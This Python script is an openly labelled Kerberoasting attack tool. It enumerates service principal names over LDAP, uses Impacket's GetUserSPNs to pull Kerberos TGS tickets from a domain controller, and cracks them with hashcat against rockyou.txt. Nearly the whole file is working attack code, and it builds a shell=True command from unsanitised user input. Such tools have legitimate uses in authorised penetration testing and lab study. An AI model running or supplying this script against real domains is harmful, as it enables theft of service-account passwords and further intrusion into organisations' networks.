#!/usr/bin/env python3
"""
Author: Andrew Xie
Date: 02/18/2026

For the wordlists, use rockyou.txt
sudo apt update
sudo apt install wordlists

if rockyou.txt is not already installed through wordlists
mkdir ~/wordlists && cd ~/wordlists
git clone https://github.com/IrishMaestro/rockyou.git
cd rockyou
gunzip rockyou.txt.gz

Kerberoasting Attack Script

This script performs Kerberoasting attacks using:
  - Impacket (GetUserSPNs) for TGS ticket enumeration and extraction
  - LDAP-utils (ldapsearch) for SPN enumeration
  - Hashcat for hash cracking
"""

import sys
import subprocess
import argparse
import os
from datetime import datetime

def enumerate_spns_ldap(domain, username, password, dc_ip):
    """Enumerate service principal names via LDAP."""
    print(f"[*] Enumerating SPNs via LDAP...")
    
    ldap_base = ','.join([f"DC={part}" for part in domain.split('.')])
    ldap_uri = f"ldap://{dc_ip}"
    bind_dn = f"{username}@{domain}"
    
    cmd = [
        'ldapsearch',
        '-x',
        '-H', ldap_uri,
        '-D', bind_dn,
        '-w', password,
        '-b', ldap_base,
        '(servicePrincipalName=*)',
        'servicePrincipalName'
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=10)
        if result.returncode != 0:
            print(f"[!] LDAP query failed: {result.stderr.strip()}")
            return []
        
        spns = []
        for line in result.stdout.split('\n'):
            if 'servicePrincipalName:' in line:
                spn = line.split('servicePrincipalName:', 1)[1].strip()
                if spn and spn not in spns:
                    spns.append(spn)
        
        return spns
    except subprocess.TimeoutExpired:
        print("[!] LDAP query timed out")
        return []
    except Exception as e:
        print(f"[!] Error during LDAP enumeration: {e}")
        return []

def request_spn_tickets(domain, username, password, dc_ip):
    """Request TGS tickets for service accounts using Impacket."""
    print(f"[*] Requesting TGS tickets via Impacket...")
    
    output_file = f"spn_tickets_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    credentials = f"{domain}/{username}:{password}"
    
    # Build command with virtual environment activation
    shell_cmd = (
        f"GetUserSPNs.py {credentials} "
        f"-dc-ip {dc_ip} -request -outputfile {output_file}"
    )
    
    try:
        result = subprocess.run(
            shell_cmd,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
            timeout=30
        )
        
        if result.returncode == 0:
            print(f"[+] Successfully extracted TGS tickets")
            print(f"[+] Output saved to: {output_file}")
            return output_file
        else:
            error_msg = result.stderr + result.stdout
            print(f"[!] GetUserSPNs failed: {error_msg.strip()}")
            return None
            
    except subprocess.TimeoutExpired:
        print("[!] GetUserSPNs timed out")
        return None
    except Exception as e:
        print(f"[!] Error requesting tickets: {e}")
        return None

def crack_hashes(hash_file, wordlist):
    """Crack Kerberos hashes using Hashcat (mode 13100 for TGS-REP RC4)."""
    if not os.path.exists(hash_file):
        print(f"[!] Hash file not found: {hash_file}")
        return
    
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        return
    
    print(f"[*] Attempting to crack hashes...")
    print(f"[*] Using wordlist: {wordlist}")
    
    cmd = [
        'hashcat',
        '-m', '13100',  # Kerberos 5 TGS-REP etype 23 (RC4)
        '-a', '0',      # Dictionary attack
        hash_file,
        wordlist,
        '--force'
    ]
    
    try:
        subprocess.run(cmd, check=False)
        
        # Display results
        print("\n[*] Checking for cracked passwords...")
        result = subprocess.run(
            ['hashcat', '-m', '13100', hash_file, '--show'],
            capture_output=True, text=True, check=False
        )
        
        if result.stdout:
            print("\n[+] Cracked hashes:")
            print(result.stdout)
        else:
            print("[*] No hashes cracked")
            
    except FileNotFoundError:
        print("[!] Hashcat not found. Install with: sudo apt install hashcat")
    except Exception as e:
        print(f"[!] Error during cracking: {e}")

def enumerate_spns_only(domain, username, password, dc_ip):
    """Enumerate and display SPNs without requesting tickets."""
    print(f"[*] Enumerating SPNs for {domain}...")
    
    spns = enumerate_spns_ldap(domain, username, password, dc_ip)
    if spns:
        print(f"\n[+] Found {len(spns)} SPN(s):")
        for spn in spns:
            print(f"    {spn}")
    else:
        print("[!] No SPNs found or LDAP query failed")


def main():
    parser = argparse.ArgumentParser(
        description='Kerberoasting attack - extract and crack service account hashes'
    )
    parser.add_argument('-d', '--domain', required=True, 
                       help='Target domain (e.g., lab.local)')
    parser.add_argument('-u', '--username', required=True, 
                       help='Username for authentication')
    parser.add_argument('-p', '--password', required=True, 
                       help='Password for authentication')
    parser.add_argument('-dc', '--dc-ip', required=True, 
                       help='Domain Controller IP address')
    parser.add_argument('-w', '--wordlist', 
                       default='/usr/share/wordlists/rockyou.txt',
                       help='Wordlist for cracking (default: rockyou.txt)')
    parser.add_argument('--enumerate-only', action='store_true',
                       help='Only enumerate SPNs without requesting tickets')
    
    args = parser.parse_args()
    # Expand user (~) and environment variables in provided paths
    args.wordlist = os.path.expanduser(os.path.expandvars(args.wordlist))
    
    print("=" * 60)
    print("Kerberoasting Attack Tool")
    print("=" * 60)
    print()
    
    # if not check_dependencies():
    #     sys.exit(1)
    
    if args.enumerate_only:
        enumerate_spns_only(args.domain, args.username, args.password, args.dc_ip)
    else:
        hash_file = request_spn_tickets(args.domain, args.username, args.password, args.dc_ip)
        
        if hash_file:
            print()
            response = input("[*] Attempt to crack hashes? (y/n): ").strip().lower()
            
            if response == 'y':
                crack_hashes(hash_file, args.wordlist)
            else:
                print(f"[*] Hashes saved: {hash_file}")
                print(f"[*] Crack manually: hashcat -m 13100 -a 0 {hash_file} <wordlist>")


if __name__ == '__main__':
    main()
